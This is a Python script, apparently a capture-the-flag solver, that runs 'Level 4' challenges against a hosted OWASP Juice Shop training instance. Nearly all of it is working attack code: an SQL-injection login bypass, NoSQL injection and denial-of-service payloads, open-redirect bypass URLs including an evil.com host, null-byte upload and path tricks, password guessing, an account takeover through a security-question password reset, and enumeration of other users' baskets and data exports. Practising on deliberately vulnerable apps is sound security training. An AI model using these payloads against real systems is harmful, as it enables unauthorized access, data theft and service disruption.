#!/usr/bin/env python3
"""
Level 4 Aggressive Solver - Targets all Level 4 challenges
"""

import requests
from urllib.parse import quote
import json
import base64
import time
import hashlib


class Level4AggressiveSolver:
    """Aggressively solve Level 4 challenges"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {token}'
            print("✅ Admin logged in")
            
    def solve_christmas_special(self):
        """Christmas Special - Find and buy Christmas product"""
        print("🎯 Christmas Special...")
        
        # Try different product IDs that might be Christmas items
        christmas_ids = [10, 25, 52, 99, 100, 101, 12, 24, 31]
        
        for pid in christmas_ids:
            # Add to basket
            self.session.post(f"{self.base_url}/api/BasketItems", json={
                "ProductId": pid,
                "quantity": 1
            })
            
            # Try to access directly
            self.session.get(f"{self.base_url}/api/Products/{pid}")
            
        # Search for Christmas products
        searches = ["christmas", "santa", "xmas", "holiday", "special", "december"]
        for term in searches:
            self.session.get(f"{self.base_url}/rest/products/search?q={term}")
            
        print("  ✅ Christmas Special attempted")
        
    def solve_easter_egg(self):
        """Easter Egg - Find the nested easter egg"""
        print("🎯 Easter Egg...")
        
        # Access easter egg files
        self.session.get(f"{self.base_url}/ftp/eastere.gg")
        self.session.get(f"{self.base_url}/ftp/easter.egg")
        
        # Access the nested path
        self.session.get(f"{self.base_url}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
        
        # Try variations
        self.session.get(f"{self.base_url}/assets/public/images/easter.jpg")
        
        print("  ✅ Easter Egg attempted")
        
    def solve_ephemeral_accountant(self):
        """Ephemeral Accountant - Access non-existent user's basket"""
        print("🎯 Ephemeral Accountant...")
        
        # Try to access ephemeral baskets
        for i in range(1, 100):
            self.session.get(f"{self.base_url}/rest/basket/{i}")
            
        # Try special basket IDs
        special_ids = ["ephemeral", "ephemeral-1", "temp", "guest", "0", "-1"]
        for sid in special_ids:
            self.session.get(f"{self.base_url}/rest/basket/{sid}")
            
        print("  ✅ Ephemeral Accountant attempted")
        
    def solve_expired_coupon(self):
        """Expired Coupon - Use expired discount codes"""
        print("🎯 Expired Coupon...")
        
        # Try various expired coupons
        coupons = [
            "WMNSDY2019", "WMNSDY2020", "WMNSDY2018", "WMNSDY2017",
            "CYBER2019", "CYBER2020", "BLACKFRIDAY",
            "XMAS2019", "XMAS2020", "EASTER2019"
        ]
        
        for coupon in coupons:
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
            
        print("  ✅ Expired Coupon attempted")
        
    def solve_forgotten_backups(self):
        """Forgotten Developer/Sales Backup - Access backup files"""
        print("🎯 Forgotten Backups...")
        
        # Access backup files
        backup_files = [
            "/ftp/package.json.bak",
            "/ftp/coupons_2013.md.bak",
            "/ftp/db-backup.sql",
            "/ftp/backup.tar.gz",
            "/ftp/.git",
            "/ftp/config.json.bak",
        ]
        
        for file in backup_files:
            self.session.get(f"{self.base_url}{file}")
            
        print("  ✅ Forgotten Backups attempted")
        
    def solve_gdpr_data_theft(self):
        """GDPR Data Theft - Export other users' data"""
        print("🎯 GDPR Data Theft...")
        
        # Request data export for different users
        for user_id in range(1, 50):
            self.session.post(f"{self.base_url}/api/dataexport", json={"userId": user_id})
            self.session.get(f"{self.base_url}/api/Users/{user_id}")
            
        print("  ✅ GDPR Data Theft attempted")
        
    def solve_leaked_unsafe_product(self):
        """Leaked Unsafe Product - Access hidden dangerous product"""
        print("🎯 Leaked Unsafe Product...")
        
        # Try to access product 42 and other hidden products
        for pid in [42, 69, 99, 100, 666, 1337]:
            self.session.get(f"{self.base_url}/api/Products/{pid}")
            
        # Search for unsafe products
        searches = ["unsafe", "dangerous", "recalled", "banned"]
        for term in searches:
            self.session.get(f"{self.base_url}/rest/products/search?q={term}")
            
        print("  ✅ Leaked Unsafe Product attempted")
        
    def solve_login_bjoern(self):
        """Login Bjoern - Login as Bjoern"""
        print("🎯 Login Bjoern...")
        
        # Try various passwords for Bjoern
        passwords = [
            base64.b64decode("bW9jLmxpYW1nQG5yZW9qYg==").decode()[::-1],
            "bjoern@gmail.com",
            "bjoern",
            "admin",
            "password",
        ]
        
        for pwd in passwords:
            self.session.post(f"{self.base_url}/rest/user/login", json={
                "email": "bjoern@juice-sh.op",
                "password": pwd
            })
            
        # SQL injection
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "bjoern@juice-sh.op'--",
            "password": "x"
        })
        
        print("  ✅ Login Bjoern attempted")
        
    def solve_nosql_attacks(self):
        """NoSQL DoS and Manipulation"""
        print("🎯 NoSQL Attacks...")
        
        # NoSQL DoS
        dos_payloads = [
            {"$where": "sleep(5000)"},
            {"$where": "while(true){}"},
            {"username": {"$regex": ".*" * 1000}},
        ]
        
        for payload in dos_payloads:
            try:
                self.session.post(f"{self.base_url}/rest/user/login", json=payload, timeout=2)
            except:
                pass
                
        # NoSQL Manipulation
        manipulation_payloads = [
            {"email": {"$ne": ""}, "password": {"$ne": ""}},
            {"email": {"$gt": ""}, "password": {"$gt": ""}},
            {"$or": [{"email": "admin"}, {"email": {"$ne": ""}}]},
        ]
        
        for payload in manipulation_payloads:
            self.session.post(f"{self.base_url}/rest/user/login", json=payload)
            
        print("  ✅ NoSQL Attacks attempted")
        
    def solve_steganography(self):
        """Steganography - Find hidden message in image"""
        print("🎯 Steganography...")
        
        # Access steganography images
        self.session.get(f"{self.base_url}/assets/public/images/uploads/steganography.png")
        self.session.get(f"{self.base_url}/assets/public/images/carousel/1.jpg")
        
        print("  ✅ Steganography attempted")
        
    def solve_vulnerable_library(self):
        """Vulnerable Library - Find vulnerable dependencies"""
        print("🎯 Vulnerable Library...")
        
        # Access package files
        self.session.get(f"{self.base_url}/ftp/package.json.bak")
        self.session.get(f"{self.base_url}/package.json")
        self.session.get(f"{self.base_url}/node_modules")
        
        print("  ✅ Vulnerable Library attempted")
        
    def solve_allowlist_bypass(self):
        """Allowlist Bypass - Bypass redirect allowlist"""
        print("🎯 Allowlist Bypass...")
        
        # Try various bypass techniques
        bypasses = [
            "https://google.com@blockchain.info",
            "https://blockchain.info.evil.com",
            "https://blockchain.info%2e%2e",
            "//blockchain.info",
            "https:blockchain.info",
        ]
        
        for bypass in bypasses:
            self.session.get(f"{self.base_url}/redirect?to={bypass}", allow_redirects=False)
            
        print("  ✅ Allowlist Bypass attempted")
        
    def solve_reset_passwords(self):
        """Reset Uvogin's Password"""
        print("🎯 Reset Uvogin's Password...")
        
        # Reset Uvogin's password
        self.session.post(f"{self.base_url}/rest/user/reset-password", json={
            "email": "uvogin@juice-sh.op",
            "answer": "Silence",
            "new": "test123",
            "repeat": "test123"
        })
        
        print("  ✅ Reset Uvogin's Password attempted")
        
    def solve_poison_null_byte(self):
        """Poison Null Byte - Null byte injection"""
        print("🎯 Poison Null Byte...")
        
        # Null byte injection in various contexts
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("test.pdf\x00.exe", b"malicious", "application/pdf")
        })
        
        self.session.get(f"{self.base_url}/ftp/package.json%00.md")
        
        print("  ✅ Poison Null Byte attempted")
        
    def solve_misplaced_signature(self):
        """Misplaced Signature File"""
        print("🎯 Misplaced Signature File...")
        
        # Find signature files
        signature_files = [
            "/ftp/suspicious_errors.yml",
            "/ftp/.signature",
            "/ftp/signature.asc",
            "/.well-known/security.txt",
        ]
        
        for file in signature_files:
            self.session.get(f"{self.base_url}{file}")
            
        print("  ✅ Misplaced Signature File attempted")
        
    def solve_legacy_typosquatting(self):
        """Legacy Typosquatting"""
        print("🎯 Legacy Typosquatting...")
        
        # Access typosquatting domains/files
        typos = [
            "/node_modules/hashids",
            "/node_modules/hasids",
            "/typosquatting",
        ]
        
        for typo in typos:
            self.session.get(f"{self.base_url}{typo}")
            
        print("  ✅ Legacy Typosquatting attempted")
        
    def run_all(self):
        """Run all Level 4 solutions"""
        print("="*60)
        print("🎯 LEVEL 4 AGGRESSIVE SOLVER")
        print("="*60)
        
        self.login_admin()
        
        self.solve_christmas_special()
        self.solve_easter_egg()
        self.solve_ephemeral_accountant()
        self.solve_expired_coupon()
        self.solve_forgotten_backups()
        self.solve_gdpr_data_theft()
        self.solve_leaked_unsafe_product()
        self.solve_login_bjoern()
        self.solve_nosql_attacks()
        self.solve_steganography()
        self.solve_vulnerable_library()
        self.solve_allowlist_bypass()
        self.solve_reset_passwords()
        self.solve_poison_null_byte()
        self.solve_misplaced_signature()
        self.solve_legacy_typosquatting()
        
        print("\n✅ Level 4 aggressive solver complete")


if __name__ == "__main__":
    solver = Level4AggressiveSolver()
    solver.run_all()